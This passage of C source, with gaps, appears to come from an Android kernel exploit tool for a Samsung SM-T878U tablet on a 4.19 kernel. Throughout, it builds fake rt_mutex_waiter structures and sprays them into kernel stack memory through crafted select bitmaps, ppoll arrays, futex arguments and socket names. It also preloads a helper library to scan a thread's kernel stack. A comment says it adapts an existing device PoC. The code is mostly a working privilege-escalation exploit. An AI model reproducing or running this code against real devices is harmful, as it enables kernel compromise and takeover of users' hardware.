...
#endif
#if defined(__arm__) && !defined(SYS_select)
...
#define F_WAIT_BITSET (FUTEX_WAIT_BITSET | FUTEX_PRIVATE_FLAG)
...
#define FRAMEPROBE_SELECT_NFDS 320
#define FRAMEPROBE_SELECT_KERNEL_WORDS (FRAMEPROBE_SELECT_NFDS / 64)
#define FRAMEPROBE_SELECT_COMPAT_WORDS (FRAMEPROBE_SELECT_NFDS / 32)
#define FRAMEPROBE_SELECT_USER_KERNEL_WORDS (FRAMEPROBE_SELECT_KERNEL_WORDS * 3)
#define FRAMEPROBE_SELECT_FAKE_WAITER_WORDS 10
#define FRAMEPROBE_PPOLL_STACK_NFDS 30
#define SENDMSG_NAME_FAKE_WAITER_WORDS 10

enum {
    IO_SUBMIT_WORD_COUNT = 8,
};

struct frameprobe_compat_timeval {
    int32_t tv_sec;
    int32_t tv_usec;
};

struct frameprobe_compat_timespec {
    int32_t tv_sec;
    int32_t tv_nsec;
};

#define IO_SUBMIT_WORDS_FMT \
    "word0=0x%016llx word1=0x%016llx word2=0x%016llx word3=0x%016llx " \
    "word4=0x%016llx word5=0x%016llx word6=0x%016llx word7=0x%016llx"
#define IO_SUBMIT_WORDS_ARGS(words_) \
    (unsigned long long)(words_)[0], (unsigned long long)(words_)[1], \
    (unsigned long long)(words_)[2], (unsigned long long)(words_)[3], \
    (unsigned long long)(words_)[4], (unsigned long long)(words_)[5], \
    (unsigned long long)(words_)[6], (unsigned long long)(words_)[7]
...
static uint64_t io_submit_words[IO_SUBMIT_WORD_COUNT];
static unsigned int io_submit_word_set_mask;
...
static int waiter_adjust_pi_after_churn;
static long waiter_adjust_pi_repeats = 1;
static int adjust_pi_start_isolated_hold;
static const char *waiter_adjust_pi_syscall = "sched-setattr";
static const char *waiter_adjust_pi_policy = "batch";
...
static long frameprobe_futex_uaddr_shift;
static long frameprobe_futex_timeout_shift = 0x40;
static long frameprobe_futex_uaddr2_shift = 0x80;
static uint64_t frameprobe_futex_val3;
static int frameprobe_futex_val3_set;
static uint32_t frameprobe_futex_uaddr_word;
static uint32_t frameprobe_futex_uaddr2_word = 0x43495645U;
static long frameprobe_ppoll_shift;
static long frameprobe_ppoll_nfds = 1;
static const char *frameprobe_ppoll_shape = "default";
static long frameprobe_select_shift = -1;
static const char *frameprobe_select_shape = "tag";
static uint64_t frameprobe_select_head_override;
static int frameprobe_select_head_override_set;
static long sendmsg_name_shift = 1;
static const char *sendmsg_name_shape = "plain";
static unsigned long sendmsg_name_bind_seq;
static const char *fake_waiter_head_mode = "fake-w0";
...
static uint64_t sendmsg_name_fake_waiter_task(uint64_t head_value);
static uint64_t sendmsg_name_fake_waiter_lock(uint64_t head_value);
                         ...
                         uint64_t a3, uint64_t a4, uint64_t a5)
{
    ...
    register uint32_t r4 asm("r4") = (uint32_t)a4;
    register uint32_t r5 asm("r5") = (uint32_t)a5;
    register uint32_t r7 asm("r7") = (uint32_t)nr;

    asm volatile("svc #0"
                 : "+r"(r0)
                 : "r"(r1), "r"(r2), "r"(r3), "r"(r4), "r"(r5), "r"(r7)
                 : "memory", "cc");
    return (long)(int32_t)r0;
#else
...
static long env_long_or(const char *name, long def)
{
    const char *value = getenv(name);
    char *end = NULL;
    long parsed;
...
static int maybe_run_idle_stack_scan(void)
{
    pid_t child;
    int status = 0;
    char pid_buf[32];
    ...
    if (!env_flag_enabled("IONSTACK_PROBE_SCAN_DURING_IDLE")) {
        return 0;
    }

    waiter_tid = __atomic_load_n(&waiter_tid_seen, __ATOMIC_ACQUIRE);
    if (waiter_tid <= 0) {
        printf("[stage] idle-stack-scan skipped: waiter tid unavailable\n");
        fflush(stdout);
        return 1;
    }

    snprintf(pid_buf, sizeof(pid_buf), "%ld", waiter_tid);
    snprintf(prio_buf, sizeof(prio_buf), "%ld", io_submit_opcode & 0xffff);
    if ((io_submit_word_set_mask & (1U << 1)) != 0) {
        snprintf(lock_buf, sizeof(lock_buf), "0x%016llx",
                 (unsigned long long)io_submit_words[1]);
    } else {
        lock_buf[0] = '\0';
    }
    /*
     * The usual io_submit task word is our sprayed fake_task, not a live
     * task_struct.  For idle-window diagnostics, prefer waiter_tid PID lookup
     * unless the operator explicitly asks to force the direct task pointer.
     */
    if ((io_submit_word_set_mask & (1U << 0)) != 0 &&
        env_flag_enabled("IONSTACK_PROBE_SCAN_USE_IO_TASK")) {
        snprintf(task_buf, sizeof(task_buf), "0x%016llx",
                 (unsigned long long)io_submit_words[0]);
    } else {
        task_buf[0] = '\0';
    }
    ...
    child = fork();
    if (child < 0) {
        printf("[stage] idle-stack-scan fork failed errno=%d (%s)\n",
               errno, strerror(errno));
        fflush(stdout);
        return 1;
    }
    if (child == 0) {
        setenv("LD_PRELOAD", "/data/local/tmp/ionstack_preload.so", 1);
        setenv("IONSTACK_STAGE", "fops-stack-scan", 1);
        setenv("IONSTACK_SCAN_PID", pid_buf, 1);
        setenv("IONSTACK_SCAN_PRIO", prio_buf, 1);
        if (lock_buf[0] != '\0') {
            setenv("IONSTACK_SCAN_LOCK", lock_buf, 1);
        }
        if (task_buf[0] != '\0') {
            setenv("IONSTACK_SCAN_TASK", task_buf, 1);
        }
        execl("/system/bin/toybox", "toybox", "true", (char *)NULL);
        fprintf(stderr,
                "[stage] idle-stack-scan exec failed errno=%d (%s)\n",
                errno, strerror(errno));
        _exit(127);
    }

    if (waitpid(child, &status, 0) < 0) {
        printf("[stage] idle-stack-scan waitpid failed errno=%d (%s)\n",
               errno, strerror(errno));
        fflush(stdout);
        return 1;
    }
    ...
    if (WIFEXITED(status)) {
        printf("[stage] idle-stack-scan exit=%d waiter_tid=%ld\n",
               WEXITSTATUS(status), waiter_tid);
    } else if (WIFSIGNALED(status)) {
        printf("[stage] idle-stack-scan signal=%d waiter_tid=%ld\n",
               WTERMSIG(status), waiter_tid);
    } else {
        printf("[stage] idle-stack-scan unexpected status=0x%x waiter_tid=%ld\n",
               status, waiter_tid);
    }
    fflush(stdout);
...
static int frameprobe_case_is_select320(void)
{
    return frameprobe_case_is("select320") ||
           frameprobe_case_is("pselect320");
}

static int frameprobe_case_is_ppoll(void)
{
    return frameprobe_case_is("ppoll");
}

static int frameprobe_ppoll_shape_is(const char *name)
{
    return strcmp(frameprobe_ppoll_shape, name) == 0;
}

static int frameprobe_ppoll_shape_valid(void)
{
    return frameprobe_ppoll_shape_is("default") ||
           frameprobe_ppoll_shape_is("tag") ||
           frameprobe_ppoll_shape_is("fake-waiter");
}

static int waiter_isolated_hold_mode_is_select320(void)
{
    return waiter_isolated_hold_mode_is("select320") ||
           waiter_isolated_hold_mode_is("pselect320");
}

static int frameprobe_select_shape_is(const char *name)
{
    return strcmp(frameprobe_select_shape, name) == 0;
}

static int frameprobe_select_shape_valid(void)
{
    return frameprobe_select_shape_is("tag") ||
           frameprobe_select_shape_is("fake-waiter");
}

static int sendmsg_name_shape_is(const char *name)
{
    return strcmp(sendmsg_name_shape, name) == 0;
}

static int sendmsg_name_shape_valid(void)
{
    return sendmsg_name_shape_is("plain") ||
           sendmsg_name_shape_is("fake-waiter") ||
           sendmsg_name_shape_is("fake-waiter-tree");
}

static int fake_waiter_head_mode_is(const char *name)
{
    return strcmp(fake_waiter_head_mode, name) == 0;
}

static int fake_waiter_head_mode_valid(void)
{
    return fake_waiter_head_mode_is("default") ||
           fake_waiter_head_mode_is("fake-w0") ||
           fake_waiter_head_mode_is("zero") ||
           fake_waiter_head_mode_is("root-black");
}

static uint64_t fake_waiter_head_word(uint64_t default_head_value)
{
    if (fake_waiter_head_mode_is("default")) {
        return default_head_value;
    }
    if (fake_waiter_head_mode_is("zero")) {
        return 0;
    }
    if (fake_waiter_head_mode_is("root-black")) {
        return 1;
    }
    if (frameprobe_select_head_override_set) {
        return frameprobe_select_head_override;
    }
    return default_head_value;
}
...
static int frameprobe_case_valid(void)
{
    return frameprobe_case_is("readlink") ||
           ...
           frameprobe_case_is("futexwait-bitset-args") ||
...
static void frameprobe_select_put_kernel_word(uint32_t *in, uint32_t *out,
                                              uint32_t *ex,
                                              int kernel_global_word,
                                              uint64_t value)
{
    uint32_t *sets[] = {in, out, ex};
    int set_idx = kernel_global_word / FRAMEPROBE_SELECT_KERNEL_WORDS;
    int kernel_word = kernel_global_word % FRAMEPROBE_SELECT_KERNEL_WORDS;
    int compat_word = kernel_word * 2;

    if (set_idx < 0 || set_idx >= 3 ||
        compat_word + 1 >= FRAMEPROBE_SELECT_COMPAT_WORDS) {
        return;
    }

    sets[set_idx][compat_word] = (uint32_t)value;
    sets[set_idx][compat_word + 1] = (uint32_t)(value >> 32);
}

static uint64_t frameprobe_select_tag_word(uintptr_t tag_value, int index)
{
    uint64_t tag = (uint64_t)tag_value;

    switch (index & 3) {
    case 0:
        return tag;
    case 1:
        return (tag << 1) ^ 0x55aa55aa55aa55aaULL;
    case 2:
        return (tag << 2) ^ 0xaa55aa55aa55aa55ULL;
    default:
        return (tag << 3) ^ 0x5a5a5a5a5a5a5a5aULL;
    }
}

static uint64_t frameprobe_select_fake_waiter_word(uintptr_t tag_value,
                                                   int index)
{
    uint64_t tag = (uint64_t)tag_value;
    uint64_t head_word = fake_waiter_head_word(tag & ~3ULL);
    uint64_t marker_task = sendmsg_name_fake_waiter_task(head_word);
    uint64_t marker_lock = sendmsg_name_fake_waiter_lock(head_word);
    /*
     * The generic OPPO K9 PoC sprays a 4.x-shaped fake waiter whose qword at
     * +0x40 is used like wake_state=3.  On this SM-T878U Samsung 4.19 tree the
     * local struct rt_mutex_waiter in kernel/locking/rtmutex_common.h is:
     *
     *   tree_entry, pi_tree_entry, task, lock, prio, deadline
     *
     * so qword[8] at +0x40 must carry waiter->prio, not wake_state.  Keep the
     * fake-waiter helpers aligned with the real T878U layout.
     */
    uint64_t waiter_prio_word =
        (uint32_t)(uint16_t)io_submit_opcode |
        ((uint32_t)(uint16_t)io_submit_reqprio << 16);
    ...
    case 4:
    case 5:
        if ((io_submit_word_set_mask & (1U << index)) != 0) {
            return io_submit_words[index];
        }
        return 0;
    case 6:
        return marker_task;
    case 7:
        return marker_lock;
    case 8:
        return waiter_prio_word;
    default:
        return 0;
    }
}

static uint64_t frameprobe_ppoll_shape_word(uintptr_t tag_value, int index)
{
    if (frameprobe_ppoll_shape_is("tag")) {
        return frameprobe_select_tag_word(tag_value, index);
    }
    if (frameprobe_ppoll_shape_is("fake-waiter")) {
        return frameprobe_select_fake_waiter_word(tag_value, index);
    }

    return 0x00000001ffffffffULL;
}

static uint64_t sendmsg_name_fake_waiter_task(uint64_t head_value)
{
    if ((io_submit_word_set_mask & (1U << 0)) != 0) {
        return io_submit_words[0];
    }
    if (regspray_value) {
        return regspray_value;
    }
    return head_value ^ 0x1111000011110000ULL;
}

static uint64_t sendmsg_name_fake_waiter_lock(uint64_t head_value)
{
    if ((io_submit_word_set_mask & (1U << 1)) != 0) {
        return io_submit_words[1];
    }
    if (stacktag_value) {
        return stacktag_value;
    }
    return head_value ^ 0x2222000022220000ULL;
}

static uint64_t sendmsg_name_fake_waiter_word(int index)
{
    uint64_t head_value = fake_waiter_head_word(0);
    uint64_t task_value = sendmsg_name_fake_waiter_task(head_value);
    uint64_t lock_value = sendmsg_name_fake_waiter_lock(head_value);
    uint64_t waiter_prio_word =
        (uint32_t)(uint16_t)io_submit_opcode |
        ((uint32_t)(uint16_t)io_submit_reqprio << 16);
    ...
    switch (index) {
    case 0:
        if (sendmsg_name_shape_is("fake-waiter-tree") &&
            (io_submit_word_set_mask & (1U << 3)) != 0) {
            return io_submit_words[3];
        }
        return head_value;
    case 1:
        if (sendmsg_name_shape_is("fake-waiter-tree") &&
            (io_submit_word_set_mask & (1U << 4)) != 0) {
            return io_submit_words[4];
        }
        return 0;
    case 2:
        if (sendmsg_name_shape_is("fake-waiter-tree") &&
            (io_submit_word_set_mask & (1U << 5)) != 0) {
            return io_submit_words[5];
        }
        return 0;
    case 3:
    case 4:
...
static int prepare_sendmsg_dgram_name(struct sockaddr_un *name,
                                      socklen_t *name_len_out,
                                      uint64_t *head_out,
                                      uint64_t *task_out,
                                      uint64_t *lock_out,
                                      uint32_t bind_seq)
{
    enum {
        raw_prefix_len = (int)offsetof(struct sockaddr_un, sun_path) + 1,
    };
    uint8_t *raw = (uint8_t *)name;
    size_t shift_bytes;
    size_t word_bytes =
        SENDMSG_NAME_FAKE_WAITER_WORDS * sizeof(uint64_t);
    size_t total_len;
    size_t total_capacity = sizeof(*name);

    if (sendmsg_name_shift < 1) {
        errno = EINVAL;
        return -1;
    }

    shift_bytes = (size_t)sendmsg_name_shift * sizeof(uint64_t);
    total_len = shift_bytes + word_bytes;
    if (shift_bytes < raw_prefix_len || total_len > total_capacity) {
        errno = EINVAL;
        return -1;
    }
    ...
    raw[offsetof(struct sockaddr_un, sun_path)] = '\0';
    for (size_t i = raw_prefix_len; i < shift_bytes; i++) {
        raw[i] = (uint8_t)(0x41u ^ ((unsigned int)i * 13u) ^
                           (unsigned int)getpid() ^
                           (unsigned int)gettid_long());
    }

    if (sendmsg_name_shape_is("fake-waiter") ||
        sendmsg_name_shape_is("fake-waiter-tree")) {
        for (int i = 0; i < SENDMSG_NAME_FAKE_WAITER_WORDS; i++) {
            uint64_t word = sendmsg_name_fake_waiter_word(i);
            memcpy(raw + shift_bytes + (i * sizeof(word)),
                   &word, sizeof(word));
        }
        if (total_len + sizeof(bind_seq) <= total_capacity) {
            memcpy(raw + total_len, &bind_seq, sizeof(bind_seq));
            total_len += sizeof(bind_seq);
        }
    } else {
        for (size_t i = shift_bytes; i < total_len; i++) {
            raw[i] = (uint8_t)(0x63u ^ ((unsigned int)i * 29u) ^
                               (unsigned int)getpid() ^
                               (unsigned int)gettid_long());
        }
    }
    ...
    if (head_out) {
        *head_out = fake_waiter_head_word(0);
    }
    if (task_out) {
        *task_out = sendmsg_name_fake_waiter_task(
            fake_waiter_head_word(0));
    }
    if (lock_out) {
        *lock_out = sendmsg_name_fake_waiter_lock(
            fake_waiter_head_word(0));
    }
    *name_len_out = (socklen_t)total_len;
    return 0;
}

static int prepare_sendmsg_dgram_local(struct sockaddr_un *name,
                                       socklen_t *name_len_out,
                                       uint32_t bind_seq)
{
    uint8_t *raw = (uint8_t *)name;
    ...
    name->sun_family = AF_UNIX;
    raw[offsetof(struct sockaddr_un, sun_path)] = '\0';
    n = snprintf((char *)raw + offsetof(struct sockaddr_un, sun_path) + 1,
                 sizeof(*name) - (offsetof(struct sockaddr_un, sun_path) + 1),
                 "iontx.%ld.%ld.%u", (long)getpid(), gettid_long(), bind_seq);
    if (n <= 0) {
        errno = EINVAL;
        return -1;
    }
...
static void frameprobe_select_prepare_sets(uint32_t *in, uint32_t *out,
                                           uint32_t *ex, uintptr_t tag_value)
{
    memset(in, 0, FRAMEPROBE_SELECT_COMPAT_WORDS * sizeof(*in));
    memset(out, 0, FRAMEPROBE_SELECT_COMPAT_WORDS * sizeof(*out));
    memset(ex, 0, FRAMEPROBE_SELECT_COMPAT_WORDS * sizeof(*ex));

    if (frameprobe_select_shift >= 0) {
        int word_count = frameprobe_select_shape_is("fake-waiter") ?
                         FRAMEPROBE_SELECT_FAKE_WAITER_WORDS : 4;
        for (int i = 0; i < word_count; i++) {
            int global_word = (int)frameprobe_select_shift + i;
            uint64_t value = frameprobe_select_shape_is("fake-waiter") ?
                             frameprobe_select_fake_waiter_word(tag_value, i) :
                             frameprobe_select_tag_word(tag_value, i);

            if (global_word == 0) {
                value &= ~7ULL;
            }
            frameprobe_select_put_kernel_word(in, out, ex, global_word, value);
        }
        return;
    }

    /*
     * These are kernel 64-bit bitmap words after compat_get_bitmap() expands
     * the arm32 user fd_set.  Avoid global word 0 so fd 0/1/2 are not clobbered
     * while still stamping all three select input sets.
     */
    frameprobe_select_put_kernel_word(in, out, ex, 1,
                                      frameprobe_select_tag_word(tag_value, 0));
    frameprobe_select_put_kernel_word(in, out, ex, 2,
                                      frameprobe_select_tag_word(tag_value, 1));
    frameprobe_select_put_kernel_word(in, out, ex, 6,
                                      frameprobe_select_tag_word(tag_value, 2));
    frameprobe_select_put_kernel_word(in, out, ex, 11,
                                      frameprobe_select_tag_word(tag_value, 3));
}

static int frameprobe_select_dup_selected(const uint32_t *in,
                                          const uint32_t *out,
                                          const uint32_t *ex,
                                          int block_fd)
{
    const uint32_t *sets[] = {in, out, ex};
    int high_block;
    int selected = 0;

    high_block = fcntl(block_fd, F_DUPFD, FRAMEPROBE_SELECT_NFDS + 16);
    if (high_block < 0) {
        return -1;
    }

    for (int fd = 3; fd < FRAMEPROBE_SELECT_NFDS; fd++) {
        int word = fd / 32;
        uint32_t bit = 1U << (fd % 32);
        if ((sets[0][word] | sets[1][word] | sets[2][word]) & bit) {
...
static void frameprobe_select_close_selected(const uint32_t *in,
                                             const uint32_t *out,
                                             const uint32_t *ex)
{
    const uint32_t *sets[] = {in, out, ex};
...
static long frameprobe_select320_syscall(uint32_t *in, uint32_t *out,
                                         uint32_t *ex, long hold_ms,
                                         int use_pselect)
{
#if defined(__arm__)
    if (use_pselect) {
        struct frameprobe_compat_timespec ts = {
            .tv_sec = (int32_t)(hold_ms / 1000),
            .tv_nsec = (int32_t)((hold_ms % 1000) * 1000000L),
        };
        return syscall(SYS_pselect6, FRAMEPROBE_SELECT_NFDS, in, out, ex,
                       &ts, NULL);
    }

    struct frameprobe_compat_timeval tv = {
        .tv_sec = (int32_t)(hold_ms / 1000),
        .tv_usec = (int32_t)((hold_ms % 1000) * 1000),
    };
    return syscall(SYS_select, FRAMEPROBE_SELECT_NFDS, in, out, ex, &tv);
#else
    if (use_pselect) {
        struct timespec ts = {
            .tv_sec = hold_ms / 1000,
    ...
    struct timeval tv = {
        .tv_sec = hold_ms / 1000,
        .tv_usec = (hold_ms % 1000) * 1000,
    };
    return select(FRAMEPROBE_SELECT_NFDS, (fd_set *)in, (fd_set *)out,
                  (fd_set *)ex, &tv);
#endif
}
...
static int waiter_churn_frameprobe_syscall(long iter)
{
    ...
    if (frameprobe_case_is("readlink")) {
        ...
        *(uint32_t *)tag = 0;
        ...
        print_ret("[W] frameprobe FUTEX_WAIT(tag)", ret, err);
               ...
               frameprobe_case_is("futexwait-bitset-args")) {
        uint32_t *uaddr =
            (uint32_t *)(void *)(tag + frameprobe_futex_uaddr_shift);
        struct timespec *hold_timeout =
            (struct timespec *)(void *)(tag + frameprobe_futex_timeout_shift);
        uint32_t *uaddr2 =
            (uint32_t *)(void *)(tag + frameprobe_futex_uaddr2_shift);
        uint64_t arg5_val3 = frameprobe_futex_val3_set ?
                             frameprobe_futex_val3 : regspray_value;
        int use_wait_bitset =
            frameprobe_case_is("futexwait-bitset-args");
        long futex_op = use_wait_bitset ? F_WAIT_BITSET : F_WAIT;
        long ret;
        int raw_err = 0;

        *uaddr = frameprobe_futex_uaddr_word;
        *uaddr2 = frameprobe_futex_uaddr2_word;
        if (use_wait_bitset) {
            if (clock_gettime(CLOCK_MONOTONIC, hold_timeout) != 0) {
                failures++;
                hold_timeout->tv_sec = 0;
                hold_timeout->tv_nsec = 0;
            } else {
                add_ms_to_timespec(hold_timeout, waiter_hold_ms);
            }
        } else {
        ...
        printf("[W] frameprobe %s iter=%ld tid=%ld arg0_uaddr=%p arg1_op=0x%lx arg2_val=0x%x arg3_timeout=%p arg4_uaddr2=%p arg5_val3=0x%016llx uaddr_shift=%ld timeout_shift=%ld uaddr2_shift=%ld timeout_sec=%ld timeout_nsec=%ld uaddr_word=0x%08x uaddr2_word=0x%08x\n",
               use_wait_bitset ? "futexwait-bitset-args" : "futexwait-args",
               iter, gettid_long(), (void *)uaddr, futex_op, 0,
               (void *)hold_timeout, (void *)uaddr2,
               (unsigned long long)arg5_val3,
               frameprobe_futex_uaddr_shift,
               frameprobe_futex_timeout_shift,
               frameprobe_futex_uaddr2_shift,
        ...
        printf("[W] frameprobe %s raw_ret=%ld raw_errno=%d (%s)\n",
               use_wait_bitset ? "FUTEX_WAIT_BITSET(args)"
                               : "FUTEX_WAIT(args)",
    ...
    } else if (frameprobe_case_is("select320") ||
               frameprobe_case_is("pselect320")) {
        uint32_t in_words[FRAMEPROBE_SELECT_COMPAT_WORDS];
        uint32_t out_words[FRAMEPROBE_SELECT_COMPAT_WORDS];
        uint32_t ex_words[FRAMEPROBE_SELECT_COMPAT_WORDS];
        uint32_t close_in[FRAMEPROBE_SELECT_COMPAT_WORDS];
        uint32_t close_out[FRAMEPROBE_SELECT_COMPAT_WORDS];
        uint32_t close_ex[FRAMEPROBE_SELECT_COMPAT_WORDS];
        int fds[2] = {-1, -1};
        int block_fd = -1;
        int selected = -1;
        long ret;
        int err;
        int use_pselect = frameprobe_case_is("pselect320");

        frameprobe_select_prepare_sets(in_words, out_words, ex_words,
                                       tag_value);
        memcpy(close_in, in_words, sizeof(close_in));
        memcpy(close_out, out_words, sizeof(close_out));
        memcpy(close_ex, ex_words, sizeof(close_ex));
        if (pipe2(fds, O_CLOEXEC | O_NONBLOCK) != 0) {
            failures++;
        } else {
            block_fd = (int)syscall(SYS_timerfd_create, CLOCK_MONOTONIC,
                                    TFD_CLOEXEC);
            if (block_fd < 0) {
                block_fd = fds[0];
            }
            selected = frameprobe_select_dup_selected(in_words, out_words,
                                                      ex_words, block_fd);
            if (selected < 0) {
                failures++;
                frameprobe_select_close_selected(close_in, close_out, close_ex);
            } else {
                if (is_target) {
                    frameprobe_publish_target_progress(iter);
                }
                errno = 0;
                ret = frameprobe_select320_syscall(in_words, out_words,
                                                   ex_words, waiter_hold_ms,
                                                   use_pselect);
                err = errno;
                if (!(ret == 0 ||
                      (ret < 0 && (err == EINTR || err == EAGAIN ||
                                   err == EWOULDBLOCK)))) {
                    failures++;
                }
                printf("[W] frameprobe %s ret=%ld errno=%d (%s) "
                       "nfds=%d compat_words=%d kernel_words=%d selected=%d "
                       "select_shift=%ld select_shape=%s "
                       "orig_in2=0x%08x orig_in3=0x%08x "
                       "orig_out2=0x%08x orig_out3=0x%08x "
                       "orig_ex2=0x%08x orig_ex3=0x%08x "
                       "res_in2=0x%08x res_out2=0x%08x res_ex2=0x%08x "
                       "target=%d\n",
                       use_pselect ? "pselect320" : "select320",
                       ret, err, err ? strerror(err) : "OK",
                       FRAMEPROBE_SELECT_NFDS, FRAMEPROBE_SELECT_COMPAT_WORDS,
                       FRAMEPROBE_SELECT_KERNEL_WORDS, selected,
                       frameprobe_select_shift, frameprobe_select_shape,
                       close_in[2], close_in[3], close_out[2], close_out[3],
                       close_ex[2], close_ex[3], in_words[2], out_words[2],
                       ex_words[2], is_target);
                fflush(stdout);
                frameprobe_select_close_selected(close_in, close_out, close_ex);
            }
            if (block_fd >= 0 && block_fd != fds[0]) {
                close(block_fd);
            }
            close(fds[0]);
            close(fds[1]);
        ...
        struct pollfd *pfd =
            (struct pollfd *)(void *)(tag + frameprobe_ppoll_shift);
        struct timespec ts = {
            .tv_sec = 0,
            .tv_nsec = 1000,
        };
        size_t bytes =
            (size_t)frameprobe_ppoll_nfds * sizeof(struct pollfd);
        uint64_t first_word = 0;
        uint64_t last_word = 0;
        int ret;
        int err;

        if ((size_t)frameprobe_ppoll_shift + bytes > slotsearch_region_len) {
            errno = EINVAL;
            failures++;
        } else {
            for (long i = 0; i < frameprobe_ppoll_nfds; i++) {
                uint64_t word =
                    frameprobe_ppoll_shape_word(tag_value, (int)i);
                memcpy((uint8_t *)pfd + (i * sizeof(struct pollfd)),
                       &word, sizeof(word));
            }
            memcpy(&first_word, pfd, sizeof(first_word));
            memcpy(&last_word,
                   (uint8_t *)pfd +
                       ((frameprobe_ppoll_nfds - 1) * sizeof(struct pollfd)),
                   sizeof(last_word));
            printf("[W] frameprobe ppoll pre nfds=%ld shift=%ld shape=%s ufds=%p first=0x%016llx last=0x%016llx timeout_nsec=%ld\n",
                   frameprobe_ppoll_nfds, frameprobe_ppoll_shift,
                   frameprobe_ppoll_shape, (void *)pfd,
                   (unsigned long long)first_word,
                   (unsigned long long)last_word, ts.tv_nsec);
            fflush(stdout);
            ret = ppoll(pfd, (nfds_t)frameprobe_ppoll_nfds, &ts, NULL);
            err = errno;
            if (ret < 0 && err != EINTR) {
                failures++;
            }
            ...
            memcpy(&last_word,
                   (uint8_t *)pfd +
                       ((frameprobe_ppoll_nfds - 1) * sizeof(struct pollfd)),
                   sizeof(last_word));
            printf("[W] frameprobe ppoll ret=%d errno=%d (%s) nfds=%ld shift=%ld shape=%s first_after=0x%016llx last_after=0x%016llx\n",
                   ret, err, err ? strerror(err) : "OK",
                   frameprobe_ppoll_nfds, frameprobe_ppoll_shift,
                   frameprobe_ppoll_shape,
                   (unsigned long long)first_word,
...
static int waiter_post_return_mode_valid(void)
{
    return waiter_post_return_mode_is("normal") ||
           ...
           waiter_post_return_mode_is("sendmsg-dgram-name-block") ||
           waiter_post_return_mode_is("bind-dgram-name-self") ||
           waiter_post_return_mode_is("bind-raw-self") ||
...
static int waiter_isolated_hold_mode_valid(void)
{
    return waiter_isolated_hold_mode_is("busy") ||
           ...
           waiter_isolated_hold_mode_is("select320") ||
           waiter_isolated_hold_mode_is("pselect320") ||
           ...
           waiter_isolated_hold_mode_is("sendmsg-dgram-name-block") ||
...
static int waiter_isolated_hold_mode_is_block_probe(void)
{
    return waiter_isolated_hold_mode_is("readv-block-small") ||
           waiter_isolated_hold_mode_is("readv-block-large") ||
           waiter_isolated_hold_mode_is_select320() ||
           waiter_isolated_hold_mode_is("epoll-block") ||
           waiter_isolated_hold_mode_is("sendmsg-block") ||
           waiter_isolated_hold_mode_is("sendmmsg-block") ||
           waiter_isolated_hold_mode_is("sendmsg-dgram-name-block") ||
...
static int waiter_post_return_select320_block_probe(int use_pselect)
{
    uint32_t in_words[FRAMEPROBE_SELECT_COMPAT_WORDS];
    uint32_t out_words[FRAMEPROBE_SELECT_COMPAT_WORDS];
    uint32_t ex_words[FRAMEPROBE_SELECT_COMPAT_WORDS];
    ...
    tag = (uint8_t *)slotsearch_region;
    tag_value = (uintptr_t)tag;
    memset(tag, 0x71, SLOTSEARCH_PAGE_SIZE);
    memcpy(tag + 128, &tag_value, sizeof(tag_value));

    frameprobe_select_prepare_sets(in_words, out_words, ex_words, tag_value);
    memcpy(close_in, in_words, sizeof(close_in));
    memcpy(close_out, out_words, sizeof(close_out));
    memcpy(close_ex, ex_words, sizeof(close_ex));
    ...
    block_fd = (int)syscall(SYS_timerfd_create, CLOCK_MONOTONIC, TFD_CLOEXEC);
    if (block_fd < 0) {
        block_fd = fds[0];
    }

    selected = frameprobe_select_dup_selected(in_words, out_words, ex_words,
                                              block_fd);
    if (selected < 0) {
    ...
    printf("[W] post-return %s prepared tag=%p tag_value=0x%016llx "
           "select_shift=%ld select_shape=%s selected=%d "
           "orig_in2=0x%08x orig_in3=0x%08x "
           "orig_out2=0x%08x orig_out3=0x%08x "
           "orig_ex2=0x%08x orig_ex3=0x%08x timeout_ms=%ld\n",
           use_pselect ? "pselect320-block" : "select320-block",
           tag, (unsigned long long)tag_value,
           frameprobe_select_shift, frameprobe_select_shape, selected,
           close_in[2], close_in[3], close_out[2], close_out[3],
           close_ex[2], close_ex[3], timeout_ms);
    fflush(stdout);
    ...
    errno = 0;
    ret = frameprobe_select320_syscall(in_words, out_words, ex_words,
                                       timeout_ms, use_pselect);
    saved_errno = errno;

    asm volatile("" : : "r"(tag), "r"(in_words), "r"(out_words), "r"(ex_words),
                 "r"(ret) : "memory");
...
static int waiter_post_return_sendmsg_dgram_name_block_probe(void)
{
    enum {
        iov_count = 8,
        chunk_len = 128,
    ...
    long timeout_ms =
        waiter_hold_ms + ceil_div_long(pre_chainwalk_delay_us, 1000) + 1000;
    long filled = 0;
    int filled_to_eagain = 0;
    int sndbuf = 4096;
    int rcvbuf = 4096;
    struct timeval tv;
    uint64_t name_head = 0;
    uint64_t name_task = 0;
    uint64_t name_lock = 0;
    uint64_t name_w0 = 0;
    uint64_t name_w1 = 0;
    uint64_t name_w2 = 0;
    uint64_t name_w3 = 0;
    ...
    int saved_errno;
    uint32_t bind_seq =
        (uint32_t)__atomic_add_fetch(&sendmsg_name_bind_seq, 1,
                                     __ATOMIC_RELAXED);
    ...
    if (prepare_sendmsg_dgram_local(&local_name, &local_len, bind_seq) != 0 ||
        prepare_sendmsg_dgram_name(&peer_name, &peer_len,
                                   &name_head, &name_task,
                                   &name_lock, bind_seq) != 0) {
        return -1;
    }

    memcpy(&name_w0,
           ((const uint8_t *)&peer_name) +
               (sendmsg_name_shift * (long)sizeof(uint64_t)),
           sizeof(name_w0));
    memcpy(&name_w1,
           ((const uint8_t *)&peer_name) +
               (sendmsg_name_shift * (long)sizeof(uint64_t)) +
    ...
    tx = socket(AF_UNIX, SOCK_DGRAM | SOCK_CLOEXEC, 0);
    rx = socket(AF_UNIX, SOCK_DGRAM | SOCK_CLOEXEC, 0);
    if (tx < 0 || rx < 0) {
        saved_errno = errno;
        if (tx >= 0) {
            close(tx);
    ...
    if (setsockopt(tx, SOL_SOCKET, SO_SNDBUF, &sndbuf, sizeof(sndbuf)) != 0 ||
        setsockopt(tx, SOL_SOCKET, SO_SNDTIMEO, &tv, sizeof(tv)) != 0 ||
        setsockopt(rx, SOL_SOCKET, SO_RCVBUF, &rcvbuf, sizeof(rcvbuf)) != 0) {
        saved_errno = errno;
        close(tx);
        close(rx);
        errno = saved_errno;
    ...
    if (bind(tx, (const struct sockaddr *)&local_name, local_len) != 0 ||
        bind(rx, (const struct sockaddr *)&peer_name, peer_len) != 0) {
        saved_errno = errno;
        close(tx);
        close(rx);
        errno = saved_errno;
    ...
    memset(fill, 0x6d, sizeof(fill));
    memset(buf, 0x5d, sizeof(buf));
    for (int i = 0; i < iov_count; i++) {
        iov[i].iov_base = buf + ((size_t)i * chunk_len);
        iov[i].iov_len = chunk_len;
    }
